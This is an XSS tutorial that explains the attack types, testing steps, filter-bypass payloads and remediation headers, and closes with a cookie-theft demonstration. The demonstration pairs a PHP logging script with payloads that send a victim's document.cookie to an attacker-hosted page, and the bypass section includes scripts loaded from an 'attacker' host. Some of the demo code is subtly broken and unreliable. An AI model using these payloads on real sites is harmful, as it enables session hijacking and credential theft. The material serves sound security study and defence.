# XSS

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into trusted website.

XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

## Impact
Malicious script can access any cookies, session tokens, or other sensitive information

## Types of XSS
- **Stored XSS (Persistent XSS)**:
When an attacker injects malicious code into the vulnerable application and this content is permanently stored in a database. when victims visit a  vulnerable application page with the stored malicious code, that time their browser execute this code and victim get popup message.

- **Reflected XSS (Non-persistent)**:
When an attacker uses a malicious link, phishing email, or another social engineering technique to trap the victim into making a request to the server and this request contains malicious code. when victim click on link then browser receive a reply with the malicious code and executes it. 

- **DOM Based XSS**:
When an HTML page is rendered in browsers, the browser downloads the HTML into local memory and automatically parses it to display the page on screen. To render a document such as an HTML page, most web browsers use an internal model like the DOM (Document Object Model) to reads the data from the DOM and executes it in the browser.

  In DOM based XSS malicious code is not sent to the server which makes it difficult to detect by web application firewalls (WAFs).

## 🔎 How to Find and Test XXS (Black Box Testing)
***1. Detect input vectors. For each web page***
- HTTP parameters
- POST data
- Hidden form field values
- Predefined Radio or Selection values

***2. Analyze each input vector to detect potential vulnerabilities***
- (greater than)>
- <(less than) 
- &(ampersand) 
- '(apostrophe or single quote) 
- "(double quote)
- e. g. <script>alert(123)</script>

***3. POC***
```
<script>alert(document.cookie)</script>
<script>alert(document.location)</script>
```

## HTML Filtered Content
- \n (new line) 
- \r (carriage return) 
- \' (apostrophe or single quote) 
- \" (double quote) 
- \\ (backslash) 
- \uXXXX (unicode values)

## Bypass XSS Filters 
Filters are based on a blacklist, they could not block every type of expressions

### e.g. payload’s:
***1. Different Syntax | Encoding***
```
" onfocus="alert(document.cookie)
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3cscript%3ealert(document.cookie)%3c/script%3e
```
***2. Bypassing non-recursive filtering***
```
<scr<script>ipt>alert(document.cookie)</script>
```
***3. Including external script***
```
<script src="http://attacker/xss.js"></script>
http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
```

   - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet (XSS Filter Evasion Cheat Sheet)
   - https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection

## ⛑️ Remediation     
### 1. Server-Side validation
   1. [x] ***X-XSS-Protection*** Header
   ```
   X-XSS-Protection: 0                           -> xss filter disabled
   X-XSS-Protection: 1                           -> xss filter enabled and sanitized the page if attack detected
   X-XSS-Protection: 1; mode=block               -> xss filter enabled and prevented rendering the page if attack detected
   X-XSS-Protection: 1; report=<reporting-uri>   -> xss filter enabled and reported the violation if attack detected
   ```
   2. [x] Use ***HTTPOnly*** cookie flag: `Set-Cookie: key=123081792183asjgdhasd; HTTPOnly`

   3. [x] Implement ***Content Security Policy***: `Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.tld`
   It's a browser side mechanism which allows you to create source allow lists for client side resources of your web application, e.g. JavaScript, CSS, images, etc. CSP via special HTTP header instructs the browser to only execute or render resources from those sources

***Refrence:*** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection

### 2. Client(Application)/Server side validation

   1. [x] HTML Encode Before Inserting Untrusted Data into HTML Element Content: `<body>...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.</body>`

   2. [x] Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes: `<div attr="...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.">content`

   3. [x] JavaScript Encode Before Inserting Untrusted Data into JavaScript Data Values: `<script>alert('...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.')</script>'

   4. [x] URL Encode Before Inserting Untrusted Data into HTML URL Parameter Values:`<a href="http://www.website.com?test=ENCODE UNTRUSTED DATA BEFORE PUTTING HERE">link</a>`(when you want to put untrusted data into HTTP GET parameter value)

   * [XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
   * [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
   * [Functions to Validate your Data](https://www.wordfence.com/learn/how-to-prevent-cross-site-scripting-attacks)


## XSS - Demonstration
Retrieve User Cookie Using XSS
1. Create ***steal.php*** file contect with below code.
```
<?php
$cookie=$_COOKIE['PHPSSID'];
$file=fopen('cookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
```
2. Create ***cookie.txt*** file on same directory.
3. Host ***steal.php*** page publicaly which can accessible through internet.
4. Insert Script on Vulnerable Parameter.
```
<script>document.location="http://hostname/steal.php"</script>
e.g:
<script>document.location="http://192.168.88.128/steal.php"</script>

<img src=a onerror=confirm(document.location="http://192.168.88.130/steal.php?cookie=" + document.cookie;)>

```
